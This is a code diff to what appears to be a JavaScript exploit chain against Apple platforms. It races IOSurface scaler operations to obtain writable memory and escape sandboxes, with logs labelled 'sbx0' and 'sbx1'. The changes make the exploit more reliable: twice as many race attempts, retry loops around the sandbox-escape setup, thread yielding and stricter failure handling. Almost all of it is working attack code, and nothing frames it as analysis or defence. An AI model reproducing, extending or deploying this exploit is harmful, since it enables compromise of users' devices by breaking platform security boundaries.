@@ -5842,7 +5842,8 @@
   let SBX1SBX1_EXP_SIZE = 8n * PAGE_SIZE;
   let ORIGINAL_EXP_MARKER = 0x41n;
   let MODIFIED_EXP_MARKER = 0x42n;
-  let n_of_race_attempts = 2048n;
+  let n_of_race_attempts = 4096n;
+  const sbx1sbx1_exp_setup_attempts = 3;
   let scratch_buffer = calloc(1n, MAX_TRANSFER_BYTES);
   let exp_bypass_interval = 0n;
   let sbx1sbx1_interval = 0n;
@@ -5998,6 +5999,10 @@
     exp_bypass_interval = Date.now();
     LOG("Before searching loop");
     for (let attempt = 0; attempt < n_of_race_attempts; attempt++) {
+      if (attempt != 0 && attempt % 512 == 0) {
+        LOG(`still searching writable EXP memory at attempt ${attempt}/${n_of_race_attempts}`);
+        pthread_yield_np(pthread_self());
+      }
       target_surface = scaler_create_surface_with_address(target_surface_address, target_surface_size);
       assert(target_surface != 0n);
       memset(target_surface_address, ORIGINAL_EXP_MARKER, target_surface_size);
@@ -6026,7 +6031,7 @@
       CFRelease(target_surface);
     }
     if (won == false) {
-      LOG("[x] Failed to create writable EXP memory!");
+      LOG(`[x] Failed to create writable EXP memory after ${n_of_race_attempts} attempts!`);
       IOServiceClose(scaler_connection);
       destroy_file_mapping(target_fm);
       kr = mach_vm_deallocate(mach_task_self(), read_address, read_size);
@@ -6174,7 +6179,21 @@
     LOG(`surface handle: ${surface.hex()}`);
     let spray_memory_object = setup_guess_address(surface);
     LOG(`spray_memory_object: ${spray_memory_object.hex()}`);
-    let sbx1sbx1_ctx = sbx1sbx1_exp(SBX1SBX1_EXP_SIZE);
+    let sbx1sbx1_ctx = null;
+    for (let setup_attempt = 1; setup_attempt <= sbx1sbx1_exp_setup_attempts; setup_attempt++) {
+      LOG(`sbx1sbx1_exp setup attempt ${setup_attempt}/${sbx1sbx1_exp_setup_attempts}`);
+      sbx1sbx1_ctx = sbx1sbx1_exp(SBX1SBX1_EXP_SIZE);
+      if (sbx1sbx1_ctx && sbx1sbx1_ctx.connection) {
+        break;
+      }
+      LOG(`[!] sbx1sbx1_exp setup attempt ${setup_attempt} failed`);
+      usleep(25000n);
+      pthread_yield_np(pthread_self());
+    }
+    if (!sbx1sbx1_ctx || !sbx1sbx1_ctx.connection) {
+      LOG("[x] sbx1sbx1_exp failed after all setup attempts");
+      return false;
+    }
     LOG(`connection: ${sbx1sbx1_ctx.connection.hex()}`);
     LOG(`source_surface: ${sbx1sbx1_ctx.source_surface.hex()}`);
     LOG(`source_surface_address: ${sbx1sbx1_ctx.source_surface_address.hex()}`);
@@ -7015,6 +7034,9 @@
   }
   LOG("closing remaker_connection: " + remaker_connection);
   xpc_connection_cancel(remaker_connection);
+  if (!sbx1sbx1_succeeded) {
+    throw new Error("sbx1sbx1 failed");
+  }
   LOG = function (msg) {
     try {
       if (sbx1_syslog) sbx1_syslog('sbx0: ' + msg);
